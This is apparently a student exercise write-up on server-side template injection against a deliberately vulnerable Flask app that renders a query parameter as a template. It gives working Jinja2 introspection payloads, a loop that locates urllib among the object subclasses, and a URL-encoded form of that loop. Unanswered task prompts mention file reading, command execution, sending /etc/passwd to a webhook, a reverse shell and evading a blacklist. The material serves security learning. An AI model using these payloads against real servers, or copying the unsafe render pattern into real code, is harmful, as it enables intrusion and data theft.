Q: Give unique ssti payloads for the given cases while following these conditions:
payloads must be as unique as possible ie if one starts with class.base.subclasses none others should start with it
OR you can use some other variant of the same payload like attr getattr instead of dot notation but again with these there should be at max two payloads looking similar

include the outputs of each part of payload eg for class.base.subclasses do class, then class.base and so on
by output I DONT MEAN paste the o/p, well do paste after slicing [:100] but you have to explain what the o/p actually is again for each step and also mention what more you could do with it other than what the payload you probably ripped off of somewhere is doing - for this you have to spend at least 30 minutes on the first 2 or 3 payloads you start researching

screenshots once in 5 paras

```
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route("/")
def home():
    if request.args.get("c"):
        return render_template_string(request.args.get("c"))
    else:
        return "Hello, send someting inside the param 'c'!"


if __name__ == "__main__":
    app.run()
```

- return the index of urllib in subclasses()
```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here
```http://127.0.0.1:5000/?c={{().__class__.__base__}}``` : ```<class 'object'>```
```http://127.0.0.1:5000/?c={{().__class__.__base__.__subclasses__()}}``` : ```[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>``` :
returns all the subclasses for that object<br>
Now to get the index at which the urllib is present, we can copy the list and iterate through it or to directly run it in the browser we can use a for loop:
```
{% set subclasses = ().__class__.__base__.__subclasses__() %}
{% for i in range(subclasses|length) %}
  {% if 'urllib' in subclasses[i].__module__ %}
    {{ i }}
  {% endif %}
{% endfor %}
```
If this is our payload, then the for loop iterates through the subclasses list and prints the index wherever it finds urllib mentioned
url encoding the block we get the payload as: ```%7B%25%20set%20subclasses%20%3D%20().__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20for%20i%20in%20range(subclasses%7Clength)%20%25%7D%0A%20%20%7B%25%20if%20'urllib'%20in%20subclasses%5Bi%5D.__module__%20%25%7D%0A%20%20%20%20%7B%7B%20i%20%7D%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D```
![image](https://github.com/poorvi1910/Web/assets/146640913/433ab890-0a54-4476-a97c-725822933382)

- get name of current python flask script


- get all the current envvars


- read a local file


- run a command


- send the contents of etc pass to  awebhook


- create a reverse shell, save your work and run the command yes on the rev shell


- re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]
